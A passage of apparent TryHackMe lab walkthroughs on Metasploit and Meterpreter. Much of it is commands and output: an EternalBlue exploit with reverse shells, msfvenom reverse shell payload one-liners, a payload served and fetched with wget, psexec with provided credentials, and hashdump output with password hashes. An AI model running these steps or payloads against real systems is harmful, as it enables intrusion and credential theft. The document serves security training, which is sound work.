shellcode stage, Bind TCP Stager with UUID Support (Windows x64)\n   10  payload/windows/x64/custom/reverse_http                              normal  No     Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)\n\n...\n</code></pre> Once we have decided on the payload, the <code>set payload</code> command can be used to use the payload.</p> <p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2\npayload =&gt; generic/shell_reverse_tcp\n</code></pre> Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (ie: payload/python/shell_reverse_tcp).</p> <p>Once a session has been opened, we can background it using <code>CTRL+Z</code> or abort it using <code>CTRL+C</code>. Backgrounding a session will be useful when working with more than one target or on the same target with a different exploit and/or shell.</p> <pre><code>[*] Command shell session 1 opened (10.13.17.49:4444 -&gt; 10.10.6.163:49174) at 2023-03-03 17:17:57 -0700\n\n\nShell Banner:\nMicrosoft Windows [Version 6.1.7601]\n-----\n\n\nC:\\Windows\\system32&gt;^Z\nBackground session 1? [y/N]  y\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt;\n</code></pre>"},{"location":"walkthroughs/thm/metasploitexploitation/#working-with-sessions","title":"Working with Sessions","text":"<p>The <code>sessions</code> command will list all active sessions. The <code>sessions</code> command supports a number of options which can be displayed using the <code>-h</code> parameter.</p> <p><pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -h\nUsage: sessions [options] or sessions [id]\n\nActive session manipulation and interaction.\n\nOPTIONS:\n\n    -c, --command &lt;command&gt;              Run a command on the session given with -i, or all\n    -C, --meterpreter-command &lt;command&gt;  Run a Meterpreter Command on the session given with -i, or all\n    -d, --list-inactive                  List all inactive sessions\n    -h, --help                           Help banner\n    -i, --interact &lt;id&gt;                  Interact with the supplied session ID\n    -k, --kill &lt;id&gt;                      Terminate sessions by session ID and/or range\n    -K, --kill-all                       Terminate all sessions\n    -l, --list                           List all active sessions\n    -n, --name &lt;id&gt; &lt;name&gt;               Name or rename a session by ID\n    -q, --quiet                          Quiet mode\n    -s, --script &lt;script&gt;                Run a script or module on the session given with -i, or all\n    -S, --search &lt;filter&gt;                Row search filter.\n    -t, --timeout &lt;seconds&gt;              Set a response timeout (default: 15)\n    -u, --upgrade &lt;id&gt;                   Upgrade a shell to a meterpreter session on many platforms\n    -v, --list-verbose                   List all active sessions in verbose mode\n    -x, --list-extended                  Show extended information in the session table\n\nMany options allow specifying session ranges using commas and dashes.\nFor example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6\n</code></pre> We can interact with any existing session using the <code>sessions -i</code> command followed by the session ID.</p> <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type               Information                               Connection\n  --  ----  ----               -----------                               ----------\n  1         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.13.17.49:4444 -&gt; 10.10.6.163:49174 (10\n                                6.1.7601] -----                          .10.6.163)\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\n\nShell Banner:\nMicrosoft Windows [Version 6.1.7601]\n-----\n\n\nC:\\Windows\\system32&gt;\nC:\\Windows\\system32&gt;search flag.txt\nsearch flag.txt\n'search' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\Windows\\system32&gt;dir \"\\*flag.txt*\" /s\ndir \"\\*flag.txt*\" /s\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Users\\Jon\\Documents\n\n07/14/2021  08:39 PM                15 flag.txt\n               1 File(s)             15 bytes\n\n^C\nAbort session 1? [y/N]  n\n\nShell Banner:\nMicrosoft Windows [Version 6.1.7601]\n-----\n\n\n     Total Files Listed:\n               1 File(s)             15 bytes\n               0 Dir(s)  39,937,695,744 bytes free\n\nC:\\Windows\\system32&gt;dir \"\\*flag.txt*\" /s\ndir \"\\*flag.txt*\" /s\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Users\\Jon\\Documents\n\n07/14/2021  08:39 PM                15 flag.txt\n               1 File(s)             15 bytes\n\nC:\\Windows\\system32&gt;cd C:\\Users\\Jon\\Documents\ncd C:\\Users\\Jon\\Documents\n\nC:\\Users\\Jon\\Documents&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is E611-0B66\n\n Directory of C:\\Users\\Jon\\Documents\n\n07/14/2021  08:39 PM    &lt;DIR&gt;          .\n07/14/2021  08:39 PM    &lt;DIR&gt;          ..\n07/14/2021  08:39 PM                15 flag.txt\n               1 File(s)             15 bytes\n               2 Dir(s)  39,937,695,744 bytes free\n\nC:\\Users\\Jon\\Documents&gt;type flag.txt\ntype flag.txt\nTHM-5455554845\n\nC:\\Windows\\system32&gt;^Z\nBackground session 2? [y/N]  y\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type               Information                               Connection\n  --  ----  ----               -----------                               ----------\n  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.13.17.49:4444 -&gt; 10.10.6.163:49187 (10\n                                6.1.7601] -----                          .10.6.163)\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -u 2\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]\n\n[*] Upgrading session ID: 2\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 10.13.17.49:4433 \n[*] Sending stage (200774 bytes) to 10.10.6.163\nmsf6 post(windows/gather/hashdump) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                            Connection\n  --  ----  ----                     -----------                            ----------\n  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.13.17.49:4444 -&gt; 10.10.6.163:49187\n                                     ion 6.1.7601] -----                    (10.10.6.163)\n  4         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ JON-PC           10.13.17.49:4433 -&gt; 10.10.6.163:49198\n                                                                            (10.10.6.163)\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 4\n[*] Starting interaction with 4...\n\nmeterpreter &gt; hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\npirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::\n</code></pre>"},{"location":"walkthroughs/thm/metasploitexploitation/#task-6-msfvenom","title":"Task 6 - Msfvenom","text":"<p>Msfvenom allows the generation of payloads available in the Metasploit framework. The payloads can be created in many different formats (PHP, exe, dll, elf, etc.) and for many diferent target systems (Apple, Windows, Android, Linux, etc.).</p> <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/CyberSec/THM/metasploit_exploitation]\n\u2514\u2500$ msfvenom -l payloads\n\nFramework Payloads (968 total) [--payload &lt;value&gt;]\n==================================================\n\n    Name                                                    Description\n    ----                                                    -----------\n    aix/ppc/shell_bind_tcp                                  Listen for a connection and spawn a command shell\n    aix/ppc/shell_find_port                                 Spawn a shell on an established connection\n    aix/ppc/shell_interact                                  Simply execve /bin/sh (for inetd programs)\n    aix/ppc/shell_reverse_tcp                               Connect back to attacker and spawn a command shell\n    android/meterpreter/reverse_http                        Run a meterpreter server in Android. Tunnel communicat\n                                                            ion over HTTP\n    android/meterpreter/reverse_https                       Run a meterpreter server in Android. Tunnel communicat\n                                                            ion over HTTPS\n    android/meterpreter/reverse_tcp                         Run a meterpreter server in Android. Connect back stag\n                                                            er\n    android/meterpreter_reverse_http                        Connect back to attacker and spawn a Meterpreter shell\n    android/meterpreter_reverse_https                       Connect back to attacker and spawn a Meterpreter shell\n    android/meterpreter_reverse_tcp                         Connect back to the attacker and spawn a Meterpreter s\n                                                            hell\n    android/shell/reverse_http                              Spawn a piped command shell (sh). Tunnel communication\n                                                             over HTTP\n    android/shell/reverse_https                             Spawn a piped command shell (sh). Tunnel communication\n                                                             over HTTPS\n    android/shell/reverse_tcp                               Spawn a piped command shell (sh). Connect back stager\n    apple_ios/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless\n                                                            )\n    apple_ios/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless\n                                                            )\n    apple_ios/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless\n                                                            )\n\n...\n</code></pre>"},{"location":"walkthroughs/thm/metasploitexploitation/#output-formats","title":"Output Formats","text":"<p>We can either generate stand-alone payloads (ie: a Windows executable for Meterpreter) or get a useable raw format (ie: Python). The <code>msfvenom --list formats</code> command can be used to list supported output formats.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#encoders","title":"Encoders","text":"<p>The aim of encoders is not to bypass anti-virus on the target system but to encode the payload itself. While encoding can have limited success against some anti-virus softwares, using modern obfuscation techniques or learning methods to inject shellcode is better solution to the problem. The command <code>msfvenom --list encoders</code> lists all available encoding scheme for the payload.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#handlers","title":"Handlers","text":"<p>Similar to exploits using reverse shell, we will need to be able to accept incoming connections generated by the msfvenom payload. When using an exploit module through msfconsole, this part is automatically handled via the <code>payload options</code>. The term commonly used to receive a connection from a target is 'catching a shell'.</p> <p>Reverse shells or Meterpreter callbacks generated in msfvenom payloads can be caught using a handler. In msfconsole we can use the <code>use exploit/multi/handler</code> to receive the incoming connection. Make sure to set the appropriate payload using <code>set payload</code> command.</p> <p><pre><code>msf6 &gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/handler) &gt; set lhost 10.13.17.49\nlhost =&gt; 10.13.17.49\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 10.13.17.49:4444\n</code></pre> When the reverse shell is triggered by the target, the connection will be received by the multi/handler and provide us with a shell.</p>"},{"location":"walkthroughs/thm/metasploitexploitation/#other-payloads","title":"Other Payloads","text":"<p>Based on the target system's configuration, msfvenom can be used to create payloads in almost all formats. Below are a few examples:</p> <ul> <li>Linux Executable and Linkable Format (elf): <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code></li> <li>Windows: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></li> <li>PHP: <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></li> <li>ASP: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></li> <li>Python: <code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</code></li> </ul>"},{"location":"walkthroughs/thm/metasploitexploitation/#practical-example","title":"Practical Example","text":"<p>Connect to target via SSH (Credentials provided: murphy:1q2w3e4r)</p> <p><pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~]\n\u2514\u2500$ ssh murphy@10.10.240.70\nmurphy@10.10.240.70's password: \nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1029-aws x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Mar  4 01:24:06 UTC 2023\n\n  System load:  0.0               Processes:           91\n  Usage of /:   4.0% of 29.02GB   Users logged in:     0\n  Memory usage: 16%               IP address for eth0: 10.10.240.70\n  Swap usage:   0%\n\n\n0 packages can be updated.\n0 updates are security updates.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Sat Mar  4 01:22:51 2023 from 10.13.17.49\nCould not chdir to home directory /home/murphy: No such file or directory\n$ \n</code></pre> Create a Meterpreter payload in .elf format.</p> <p>Attacker Machine: <pre><code>\u2500\u2500(siachen\u327fkali)-[~/Downloads]\n\u2514\u2500$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.13.17.49 LPORT=4444 -f elf &gt; rev_shell.elf\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 123 bytes\nFinal size of elf file: 207 bytes\n\n\u250c\u2500\u2500(siachen\u327fkali)-[~/Downloads]\n\u2514\u2500$ ls\nrev_shell.elf\n</code></pre> Start a Python3 HTTP server to serve the file to the target.</p> <p>Attacker Machine: <pre><code>\u250c\u2500\u2500(siachen\u327fkali)-[~/Downloads]\n\u2514\u2500$ python3 -m http.server 8000\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n</code></pre> From the SSH connection on target, download the payload.</p> <p>Target Machine: <pre><code>$ wget 10.13.17.49:8000/rev_shell.elf\n--2023-03-04 01:28:57--  http://10.13.17.49:8000/rev_shell.elf\nConnecting to 10.13.17.49:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 207 [application/octet-stream]\nSaving to: \u2018rev_shell.elf\u2019\n\nrev_shell.elf                100%[==============================================&gt;]     207  --.-KB/s    in 0.01s   \n\n2023-03-04 01:28:57 (17.2 KB/s) - \u2018rev_shell.elf\u2019 saved [207/207]\n\n$ ls\nrev_shell.elf\n$ \n</code></pre> Start our multi/handler in msfconsole.</p> <p>Attacker Machine: <pre><code>msf6 &gt; use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 10.13.17.49\nlhost =&gt; 10.13.17.49\n\nmsf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\n\nmsf6 exploit(multi/handler) &gt; show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (linux/x86/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.13.17.49      yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 10.13.17.49:4444\n</code></pre> Execute the payload. We need to get root access through <code>sudo su</code> in order to be able to read the <code>/etc/shadow</code> file.</p> <p>Target Machine: <pre><code>$ sudo su\n[sudo] password for murphy: \nroot@ip-10-10-240-70:/dev/shm# chmod +x rev_shell.elf\nroot@ip-10-10-240-70:/dev/shm# ls -l\ntotal 4\n-rwxrwxr-x 1 murphy murphy 207 Mar  4 01:35 rev_shell.elf\nroot@ip-10-10-240-70:/dev/shm# ./rev_shell.elf\n</code></pre> Attacker Machine: <pre><code>msf6 exploit(multi/handler) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                   Information                             Connection\n  --  ----  ----                   -----------                             ----------\n  1         meterpreter x86/linux  murphy @ ip-10-10-240-70.eu-west-1.com  10.13.17.49:4444 -&gt; 10.10.240.70:35302\n                                   pute.internal                           (10.10.240.70)\n</code></pre> Use <code>post/linux/gather/hashdump</code> module to dump the user's password hash.</p> <p>Attacker Machine: <pre><code>msf6 exploit(multi/handler) &gt; use post/linux/gather/hashdump\nmsf6 post(linux/gather/hashdump) &gt; show options\n\nModule options (post/linux/gather/hashdump):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION                   yes       The session to run this module on\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 post(linux/gather/hashdump) &gt; set session 1\nsession =&gt; 1\nmsf6 post(linux/gather/hashdump) &gt; run\n\n[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh\n[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh\n[+] Unshadowed Password File: /home/siachen/.msf4/loot/20230303190258_default_10.10.240.70_linux.hashes_398504.txt\n[*] Post module execution completed\n</code></pre></p>"},{"location":"walkthroughs/thm/metasploitmeterpreter/","title":"Metasploit - Meterpreter","text":""},{"location":"walkthroughs/thm/metasploitmeterpreter/#task-1-introduction-to-meterpreter","title":"Task 1 - Introduction to Meterpreter","text":"<p>Meterpreter is a Metasploit payload that runs on the target system and acts as an agent within a command and control architecture. Meterpreter runs on the target system but is not installed on it. It runs in memory (RAM) and does not write itself to the disk on the target in an effort avoid detection during an antivirus scan. On a target system, Meterpreter behaves as a process.</p> <p>Meterpreter also aims to be avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs.</p> <p>It should be noted that Meterpreter is recognized by major antivirus software.</p>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#task-2-meterpreter-flavors","title":"Task 2 - Meterpreter Flavors","text":"<p>Metasploit payloads can be split into two categories: inline (also called single) and staged. Staged payloads are sent to the target in two steps. An initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size. The inline payloads are sent ina single step. </p> <p>Meterpreter payloads are also divided into staged and inline versions. A list of Meterpreter payloads can be obtained by using the command <code>msfvenom --list payloads | grep meterpreter</code>.</p> <p>The decision on which version of Meterpreter to use will mostly be based on three factors: - The target operating system. - Components available on the target system (ie: Python, PHP, etc.) - Network connection type you can have with the target system (ie: Are raw TCP connections allowed?)</p> <p>If not using Meterpreter as a standalone payload generated by Msfvenonm, our choices will be limited to using exploits from Msfconsole.</p>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#task-3-meterpreter-commands","title":"Task 3 - Meterpreter Commands","text":"<p>Typing <code>help</code> on any Meterpreter session (shown by <code>meterpreter&gt;</code> in the prompt) will list all available commands. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.</p> <p>Meterpreter provides three primary categories of tools: - Built-in commands - Meterpreter tools - Meterpreter scripting</p> <p>When running the <code>help</code> command, we will see Meterpreter commands are listed under different categories: - Core commands - File system commands - Networking commands - System commands - User interface commands - Webcam commands - Audio output commands - Elevate commands - Password database commands - Timestomp commands</p> <p>Please note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.</p>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#core-commands","title":"Core Commands","text":"<ul> <li><code>background</code>: Backgrounds the current session.</li> <li><code>exit</code>: Terminates the Meterpreter session.</li> <li><code>guid</code>: Get the session GUID (Globally Unique Identifier).</li> <li><code>help</code>: Displays the help menu.</li> <li><code>info</code>: Displays information about a Post module.</li> <li><code>irb</code>: Opens an interactive Ruby shell on the current session.</li> <li><code>load</code>: Loads one or more Meterpreter extensions.</li> <li><code>migrate</code>: Allows you to migrate Meterpreter to another process.</li> <li><code>run</code>: Executes a Meterpreter script or Post module.</li> <li><code>sessions</code>: Quickly switch to another session.</li> </ul>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#file-system-commands","title":"File System Commands","text":"<ul> <li><code>cd</code>: Change directory.</li> <li><code>ls</code>: List files in the current directory (<code>dir</code> will also work).</li> <li><code>pwd</code>: Prints the current working directory.</li> <li><code>edit</code>: Allows you to edit a file.</li> <li><code>cat</code>: Shows contents of a file to the screen.</li> <li><code>rm</code>: Deletes the specified file.</li> <li><code>search</code>: Search for files.</li> <li><code>upload</code>: Upload a file or directory.</li> <li><code>download</code>: Download a file or directory.</li> </ul>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#networking-commands","title":"Networking Commands","text":"<ul> <li><code>arp</code>: Displays the host ARP cache.</li> <li><code>ifconfig</code>: Displays network interfaces available on the target system.</li> <li><code>netstat</code>: Displays the network connections.</li> <li><code>portfwd</code>: Forwards a local port to a remote service.</li> <li><code>route</code>: Allows you to view and modify the routing table.</li> </ul>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#system-commands","title":"System Commands","text":"<ul> <li><code>clearev</code>: Clears the event logs.</li> <li><code>execute</code>: Executes a command.</li> <li><code>getpid</code>: Shows the current process identifier.</li> <li><code>getuid</code>: Shows the user what Meterpreter is running as.</li> <li><code>kill</code>: Terminates a process.</li> <li><code>pkill</code>: Terminates processes by name.</li> <li><code>ps</code>: Lists running processes.</li> <li><code>reboot</code>: Reboots the remote computer.</li> <li><code>shell</code>: Drops into a system command shell.</li> <li><code>shutdown</code>: Shuts down the remote computer.</li> <li><code>sysinfo</code>: Gets information about the remote system.</li> </ul>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#other-commands","title":"Other Commands","text":"<ul> <li><code>idletime</code>: Returns the number of seconds the remote user has been idle.</li> <li><code>keyscan_dump</code>: Dumps the keystroke buffer.</li> <li><code>keyscan_start</code>: Starts capturing keystrokes.</li> <li><code>keyscan_stop</code>: Stops capturing keystrokes.</li> <li><code>screenshare</code>: Allows you to watch the remote user's desktop in real time.</li> <li><code>screenshot</code>: Grabs a screenshot of the interactive desktop.</li> <li><code>record_mic</code>: Records audio from the default microphone for X seconds.</li> <li><code>webcam_chat</code>: Starts a video chat.</li> <li><code>webcam_list</code>: Lists webcams.</li> <li><code>webcam_snap</code>: Takes a snapshot from the specified webcam.</li> <li><code>webcam_stream</code>: Plays a video stream from the specified webcam.</li> <li><code>getsystem</code>: Attempts to elevate your privilege to that of local system.</li> <li><code>hashdump</code>: Dumps the contents of the SAM database.</li> </ul>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#task-4-post-exploitation-with-meterpreter","title":"Task 4 - Post-Exploitation with Meterpreter","text":"<p>This section includes a brief discussion on some of the more common commands used during engagements. Nothing further needs to be added here.</p>"},{"location":"walkthroughs/thm/metasploitmeterpreter/#task-5-post-exploitation-challenge","title":"Task 5 - Post Exploitation Challenge","text":"<p>We are provided with initial credentials which we can use to compromise SMB as suggested: <code>ballen:Password1</code>.</p> <p>Let's go ahead and open Metasploit using the <code>msfconsole</code> command. Since we are advised that our initial foothold can be established by exploiting the SMB service, lets go ahead and use the <code>exploit/windows/smb/psexec</code> exploit with the provided credentials.</p> <p>This module uses a valid username and password (or password hash) to execute an arbitrary payload.</p> <p><pre><code>msf6 &gt; use exploit/windows/smb/psexec \n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/psexec) &gt; set rhost 10.10.244.120\nrhost =&gt; 10.10.244.120\nmsf6 exploit(windows/smb/psexec) &gt; set smbuser ballen\nsmbuser =&gt; ballen\nmsf6 exploit(windows/smb/psexec) &gt; set smbpass Password1\nsmbpass =&gt; Password1\nmsf6 exploit(windows/smb/psexec) &gt; set lhost 10.13.17.49\nlhost =&gt; 10.13.17.49\nmsf6 exploit(windows/smb/psexec) &gt; show options\n\nModule options (exploit/windows/smb/psexec):\n\n   Name                  Current Setting  Required  Description\n   ----                  ---------------  --------  -----------\n   RHOSTS                10.10.244.120    yes       The target host(s), see https://docs.metasploit.com/docs/using\n                                                    -metasploit/basics/using-metasploit.html\n   RPORT                 445              yes       The SMB service port (TCP)\n   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing\n   SERVICE_DISPLAY_NAME                   no        The service display name\n   SERVICE_NAME                           no        The service name\n   SMBDomain             .                no        The Windows domain to use for authentication\n   SMBPass               Password1        no        The password for the specified username\n   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...)\n                                                     or a normal read/write folder share\n   SMBUser               ballen           no        The username to authenticate as\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.13.17.49      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(windows/smb/psexec) &gt; run\n\n[*] Started reverse TCP handler on 10.13.17.49:4444 \n[*] 10.10.244.120:445 - Connecting to the server...\n[*] 10.10.244.120:445 - Authenticating to 10.10.244.120:445 as user 'ballen'...\n[*] 10.10.244.120:445 - Selecting PowerShell target\n[*] 10.10.244.120:445 - Executing the payload...\n[+] 10.10.244.120:445 - Service start timed out, OK if running a command or non-service executable...\n[*] Sending stage (175686 bytes) to 10.10.244.120\n[*] Meterpreter session 1 opened (10.13.17.49:4444 -&gt; 10.10.244.120:49181) at 2023-03-06 10:33:51 -0700\n\nmeterpreter &gt;  \n</code></pre> We can use the <code>sysinfo</code> command to get more information on the target system.</p> <p><pre><code>meterpreter &gt; sysinfo\nComputer        : ACME-TEST\nOS              : Windows 2016+ (10.0 Build 17763).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : FLASH\nLogged On Users : 7\nMeterpreter     : x86/windows\nmeterpreter &gt;\n</code></pre> In order to find any possible shares created by the user we can use the Metaploit module <code>post/windows/gather/enum_shares</code>. Note that we need to background our Meterpreter session before we can use the module.</p> <p><pre><code>meterpreter &gt; background\n[*] Backgrounding session 1...\nmsf6 exploit(windows/smb/psexec) &gt; use post/windows/gather/enum_shares \nmsf6 post(windows/gather/enum_shares) &gt; show options\n\nModule options (post/windows/gather/enum_shares):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   CURRENT  true             yes       Enumerate currently configured shares\n   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog\n   RECENT   true             yes       Enumerate recently mapped shares\n   SESSION                   yes       The session to run this module on\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 post(windows/gather/enum_shares) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                      Connection\n  --  ----  ----                     -----------                      ----------\n  1         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ ACME-TEST  10.13.17.49:4444 -&gt; 10.10.244.120:49181 (10.\n                                                                      10.244.120)\n\nmsf6 post(windows/gather/enum_shares) &gt; set session 1\nsession =&gt; 1\nmsf6 post(windows/gather/enum_shares) &gt; run\n\n[*] Running module against ACME-TEST (10.10.244.120)\n[*] The following shares were found:\n[*]     Name: SYSVOL\n[*]     Path: C:\\Windows\\SYSVOL\\sysvol\n[*]     Remark: Logon server share \n[*]     Type: DISK\n[*] \n[*]     Name: NETLOGON\n[*]     Path: C:\\Windows\\SYSVOL\\sysvol\\FLASH.local\\SCRIPTS\n[*]     Remark: Logon server share \n[*]     Type: DISK\n[*] \n[*]     Name: speedster\n[*]     Path: C:\\Shares\\speedster\n[*]     Type: DISK\n[*] \n[*] Post module execution completed \n</code></pre> To dump the NTLM hashes, we can use the <code>hashdump</code> command in Meterpreter. We will need to migrate to the <code>lsass.exe</code> process before we can use hashdump.</p> <p><pre><code>msf6 post(windows/gather/enum_shares) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; ps\n\nProcess List\n============\n\n PID   PPID  Name                Arch  Session  User                          Path\n ---   ----  ----                ----  -------  ----                          ----\n 0     0     [System Process]\n 4     0     System              x64   0\n 68    4     Registry            x64   0\n 396   4     smss.exe            x64   0\n 488   684   dwm.exe             x64   1        Window Manager\\DWM-1          C:\\Windows\\System32\\dwm.exe\n 548   536   csrss.exe           x64   0\n 620   612   csrss.exe           x64   1\n 668   536   wininit.exe         x64   0\n 684   612   winlogon.exe        x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\winlogon.exe\n 748   668   services.exe        x64   0\n 764   668   lsass.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsass.exe\n 884   748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 896   748   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 948   748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 992   748   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 1060  748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 1176  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1184  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    